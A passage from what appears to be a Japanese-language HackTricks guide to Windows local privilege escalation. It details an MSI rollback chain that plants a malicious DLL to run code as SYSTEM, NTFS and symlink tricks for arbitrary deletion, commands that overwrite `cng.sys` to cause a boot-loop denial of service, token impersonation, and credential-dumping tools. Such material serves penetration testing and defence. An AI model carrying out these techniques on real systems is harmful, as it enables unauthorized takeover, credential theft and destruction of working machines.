CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用な primitive は junction redirect ではなく、path reuse です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に、保護された rollback data を格納する同じ pathname を再作成させます。Cleanup は古い `TempPackages` の名前を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` と redirection-trust mitigation が意図した境界を回避します。<sup>[[41]](#references)</sup>

この削除 primitive は、以下の rollback chain に適用できます。別個の `Installer\Folders` record を保持し、保護された `C:\Config.Msi` を削除して NULL DACL で再作成し、installer が DACL を強化する前に `WRITE_DAC` が付与された handle を保持します。事前に開いた handle で `NtSetSecurityObject` を使って permissive DACL を復元でき、その後 rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、この path を修正しました。COM call は引き続き成功を返す場合がありますが、攻撃者が制御する path は `TempPackages` に追加されなくなります。method の戻り値が成功したことを patch の判定に使わず、2025 年 4 月の Windows security updates を適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

この technique の概要は次のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **非 admin user** が実行できるよう、installer を **"UAC Compliant"** としてマークします。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall process はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いたファイル handle を `GetFinalPathNameByHandle` で **poll** し、ファイルが `C:\Config.Msi\<random>.rbf` になるタイミングを検出します。

- Step 3: 独自の同期
    - `.msi` には、次の処理を行う **custom uninstall action (`SyncOnRbfWritten`)** が含まれています。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event を **wait** してから uninstall を続行します。

- Step 4: `.rbf` の削除をブロックする
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに `.rbf` ファイルを **開きます**。これにより、**ファイルの削除を防げます**。
    - その後、uninstall が完了できるように通知を返します。
    - Windows Installer は `.rbf` の削除に失敗し、すべての内容を削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者が `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` は空になり**、hijack の準備が整います。

> この時点で、**SYSTEM-level の任意フォルダー削除 vulnerability をトリガーして** `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を悪意あるものに置き換える**

- Step 6: 弱い ACL を設定して `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を開いたままにします。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的に失敗させる variable。
    - この install は、`.rbs` と `.rbf` を再び読み込む **rollback** のトリガーに使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - その filename を記録します。

- Step 9: Rollback の前に同期する
    - `.msi` には、次の処理を行う **custom install action (`SyncBeforeRollback`)** が含まれています。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行前に **wait** します。

- Step 10: 弱い ACL を再設定する
    - `.rbs created` event を受け取ると:
        - Windows Installer が `C:\Config.Msi` に強い ACL を再設定します。
        - しかし、`WRITE_DAC` を持つ handle が残っているため、再び **弱い ACL を設定できます**。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを、Windows に次の処理を指示する **偽の rollback script** で上書きします。
        - `.rbf` ファイル（悪意ある DLL）を、特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元します。
    - **悪意ある SYSTEM-level payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback をトリガーする
    - 同期 event を通知して installer を再開させます。
    - **type 19 custom action (`ErrorOut`)** が、既知のタイミングで install を **意図的に失敗させる**よう設定されています。
    - これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は次の処理を行います。
        - 悪意ある `.rbs` を読み込みます。
        - `.rbf` DLL を target location にコピーします。
    - これで、**SYSTEM が読み込む path に悪意ある DLL が配置されます**。

- Final Step: SYSTEM code を実行する
    - hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで、あなたの code が SYSTEM として実行されます**。


### 任意の File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback technique（前述のもの）は、`C:\Config.Msi` のような **フォルダー全体を削除できる**ことを前提としています。しかし、vulnerability で許可される操作が **任意のファイル削除**だけだったらどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります。

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が保存されています。

そのため、フォルダーの `::$INDEX_ALLOCATION` ストリームを**削除**すると、NTFS はファイルシステムから**フォルダー全体を削除**します。

これは、次のような標準のファイル削除 API を使って実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* の削除 API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
任意のファイルやフォルダーを削除することはできないものの、攻撃者が制御するフォルダーの**内容を削除することはできる** primitive がある場合はどうでしょうか？

1. Step 1: おとりフォルダーとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock によって**実行が一時停止**します。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御がコールバックに渡されます。

4. Step 4: oplock コールバック内で削除先をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
    - oplock を破棄せずに `folder1` を空にします。
    - `file1.txt` を直接削除しないでください。oplock が早まって解除されます。

- Option B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダのメタデータを保存するNTFSの内部ストリームを対象としており、これを削除するとフォルダ自体が削除されます。

5. Step 5: oplockを解放する
- SYSTEMプロセスは処理を続け、`file1.txt`を削除しようとします。
- しかし、junction + symlinkにより、実際には次のものが削除されます：
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します — **ファイルを書き込めない**場合や、**弱いアクセス許可を設定できない**場合でも可能です。

次のように、**重要な Windows ドライバー**の名前を付けた**フォルダー**（ファイルではありません）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` カーネルモードドライバーに対応します。
- **あらかじめフォルダーとして作成しておくと**、Windows は起動時に実際のドライバーを読み込めなくなります。
- その後、Windows は起動時に `cng.sys` の読み込みを試みます。
- フォルダーを認識し、**実際のドライバーを解決できず**、**クラッシュするか、起動が停止します**。
- **フォールバックはなく**、外部から介入（例: ブート修復やディスクへのアクセス）しない限り、**復旧できません**。

### 特権ログ/バックアップパスと OM symlinks から任意ファイル上書き / ブート DoS へ

**特権サービス**が**書き込み可能な設定ファイル**から読み込んだパスにログ/エクスポートを書き込む場合、Object Manager symlinks + NTFS mount points でそのパスをリダイレクトすれば、特権による書き込みを任意ファイル上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- 書き込み先パスを格納する設定ファイルを攻撃者が書き換えられること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定ファイルを読み取り、特権ログの保存先を特定します。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. 管理者権限なしでパスをリダイレクトします:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例：管理者が「テスト SMS を送信」を実行）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされた対象を（hex/PE parser で）調べて破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとするため、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在すると、こちらが先に試される可能性があり、破損データを使った信頼性の高い DoS の標的になります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで実行している場合、**SYSTEM への道筋**は、新しいサービスを**作成して実行するだけ**と簡単なことがあります。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binary を作成する際は、それが有効な service であること、または binary が必要な処理を速やかに実行することを確認してください。有効な service でない場合、20 秒で停止されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated のレジストリエントリを有効化**し、_**.msi**_ wrapper を使って reverse shell を**インストール**できます。\
関連するレジストリキーと _.msi_ package のインストール方法については、[こちらをご覧ください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは**[**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### SeDebug + SeImpersonate から Full Token privileges へ

これらの token privileges があれば（おそらく、すでに High Integrity の process 内で見つかります）、SeDebug privilege を使って（protected processes を除く）**ほぼすべての process を開き**、process の **token をコピー**して、その token を使って**任意の process を作成**できます。\
通常、この technique では、すべての token privileges を持つ SYSTEM として実行中の process を**選択します**（_はい、すべての token privileges を持たない SYSTEM process もあります_）。\
提案した technique を実行するコードの[**例はこちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使います。手順は、**pipe を作成し、その pipe に書き込む service を作成または悪用する**ことです。続いて、**`SeImpersonate`** privilege を使って pipe を作成した **server** が、pipe client（service）の **token を impersonate** し、SYSTEM privileges を取得できます。\
[**named pipes について詳しく知りたい場合はこちらをご覧ください**](#named-pipe-client-impersonation)。\
name pipes を使って high integrity から System に移行する[**方法の例はこちらをご覧ください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行中の **process** によって **ロード**される **dll を hijack** できれば、その permissions で任意の code を実行できます。そのため Dll Hijacking は、この種の privilege escalation にも有用です。さらに、high integrity process からは、dll のロードに使われる folders に対する **write permissions** があるため、はるかに**簡単に実行できます**。\
**Dll hijacking について**[**詳しくはこちらをご覧ください**](dll-hijacking/index.html)**。**

### **Administrator または Network Service から System へ**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE または NETWORK SERVICE から full privs へ

**お読みください:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows local privilege escalation の vectors を探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認します (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの misconfigurations を確認し、情報を収集します (**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認します**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP に保存された session 情報を抽出します。ローカルで使用する場合は -Thorough を指定してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 内で spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell 製の ADIDNS/LLMNR/mDNS spoofing および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows の基本的な privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索します（Watson により非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカル checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索します（VisualStudio を使って compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索して host を enumeration します（privesc よりも情報収集 tool に近いものです）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認します（github に precompiled executable があります）。非推奨です。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられる misconfigurations を確認します（python 製 exe）。非推奨です。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post をもとに作成された tool です（正常に動作するために accesschk は必要ありませんが、利用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（ローカルの python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploit を推奨します（ローカルの Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは、適切なバージョンの .NET を使って compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者 host にインストールされている .NET のバージョンを確認するには、次のように実行します:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダーのアクセス権の弱点を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows権限昇格チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linuxローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows攻撃: ATは新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBAマクロフィッシング → hMailServerの認証情報を復号 → Veeam CVE-2023-27532でSYSTEM権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: フォーマット文字列leak + stack BOF → VirtualAlloc ROP (RCE) とカーネルトークン窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: カーネルの影で繰り広げられる追跡劇](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADAシステムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [シンボリックリンクテストツール – CreateSymlinkの使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windowsにおけるシンボリックリンクの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.jsの信頼の落とし穴: Windowsにおける危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.jsモジュール: `node_modules`フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリの乗っ取り](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [MicroslopでのPwn2Own: CLDFLTとDirectXカーネルの競合状態を連鎖させたWindows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する一つのI/O Ring: Windows 11における完全な読み書きエクスプロイトプリミティブ](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用して権限昇格する方法とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPsエクスプロイトコード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS攻撃パート2: CVE-2020-1013、Windows 10のローカル権限昇格1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberosのリソースベース制約付き委任: イメージの変更が権限昇格につながるケース](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10のSSH AgentからSSH秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – エンタープライズの更新サーバーをバックドア製造所に変える (0_o) – パート1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – エンタープライズの更新サーバーをバックドア製造所に変える (0_o) – パート2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installerフォルダー削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - 完全な記憶: NT AUTHORITY\SYSTEMに戻る手順をたどる](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Windows MIDI Servicesの共有メモリオフセットによる権限昇格に関するアドバイザリ](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
